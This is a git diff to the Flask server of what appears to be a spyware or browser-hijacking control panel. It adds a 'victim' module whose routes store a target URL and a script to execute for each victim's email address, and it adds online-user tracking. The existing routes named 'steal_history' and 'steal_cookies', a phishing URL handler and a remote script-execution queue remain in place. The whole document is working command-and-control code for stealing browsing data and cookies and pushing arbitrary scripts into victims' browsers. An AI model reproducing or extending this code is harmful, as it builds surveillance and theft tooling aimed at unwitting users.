@@ -4,7 +4,7 @@ from flask import Flask, render_template, request, redirect, url_for, jsonify
 # Initial Database Dos
 import general_db
 
-from pyfiles import users, login, secure, history, cookies, phish
+from pyfiles import users, login, secure, history, cookies, victim, phish
 
 app = Flask(__name__)
 
@@ -13,8 +13,10 @@ executeQueue = {} # Faster than DB
 @app.route("/")
 def index():
     usrs = users.get_all_users()
+    online_usrs = users.get_online_users()
     login_kws = login.get_login_kw()
-    return render_template("index.html", users = usrs, login_kws = login_kws )
+    return render_template("index.html", users = usrs, login_kws = login_kws, recent_users = online_usrs)
+
 
 @app.route('/online_check', methods=['POST'])
 def online_check(): 
@@ -30,9 +32,10 @@ def view_user(email):
     logs = login.get_logins_by_user(email)
     secure_urls = secure.getFromSecure(email)
     random_urls = secure.getFromRandom(email)
+    victim_urls = victim.getFromVictim(email)
     phish_urls = phish.get_phish_by_user(email)
 
-    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs, secure_urls = secure_urls, random_urls = random_urls, phish_urls = phish_urls)
+    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs, secure_urls = secure_urls, random_urls = random_urls, phish_urls = phish_urls, victim_urls=victim_urls)
 
 ########### SECURE ###########
 @app.route('/addSecure/<email>', methods=['POST'])
@@ -69,6 +72,26 @@ def delete_random(email, url):
 @app.route('/get_random/<email>', methods=['GET'])
 def get_random(email):
     return jsonify(r=secure.getFromRandom(email))
+
+########### VICTIM ###########
+@app.route('/addVictim/<email>', methods=['POST'])
+def add_victim(email):
+    if request.method == 'POST':
+        url = request.form['victim_url']
+        script = request.form['execute-script']
+        victim.addToVictim(email, script, url)
+        return redirect(url_for('view_user', email=email))
+
+@app.route('/deleteVictim/<email>/<url>', methods=['POST'])
+def delete_victim(email, url):
+    if request.method == 'POST':
+        victim.removeFromVictim(email, url)
+        return redirect(url_for('view_user', email=email))
+
+@app.route('/get_victim/<email>', methods=['GET'])
+def get_victim(email):
+    return jsonify(r=victim.getFromVictim(email))
+
 
 ########## History #########
 @app.route("/steal_history", methods=['POST'])
@@ -130,7 +153,7 @@ def steal_cookies():
 @app.route("/phish/<email>", methods=['GET', 'POST'])
 def phishy(email): 
     if request.method == 'GET': 
-        return redirect(url_for('view_user', email=email))
+        return jsonify(urls=phish.get_phish_urls(email))
 
 @app.route("/phish/<email>/<url>")
 def phish_code(email, url):
@@ -168,11 +191,13 @@ def add_phish(email):
 @app.route("/execute_script/<email>", methods=['GET', 'POST'])
 def execute_script(email):
     if request.method == 'POST':
-        script = request.form['script']
-        oldList = executeQueue.get(str(email), [])
-        oldList.append(str(script))
-        executeQueue[str(email)] = oldList
-        return redirect(url_for('index'))
+        # script = request.form['execute-script']
+        # oldList = executeQueue.get(str(email), [])
+        # oldList.append(str(script))
+        # executeQueue[str(email)] = oldList
+        victim_urls = victim.getFromVictim(email)
+        print list(victim_urls)
+        return redirect(url_for('view_user', email=email))
     elif request.method == 'GET':
         #print "EMAIL:", str(email)
         #print "EXECUTE:", executeQueue
@@ -193,7 +218,7 @@ if __name__ == "__main__":
     app.config['TEMPLATES_AUTO_RELOAD'] = True
 
     # uncomment this if you want to erase all tables
-    general_db.drop_all_tables()
+    # general_db.drop_all_tables()
 
     # uncomment this if you want to create all tables
     general_db.create_all_tables()
@@ -202,6 +227,6 @@ if __name__ == "__main__":
     # general_db.delete_db()
 
     # uncomment this if you want to add default values 
-    general_db.insert_default_values()
+    # general_db.insert_default_values()
 
     app.run(host='0.0.0.0', port=5000, debug=True)
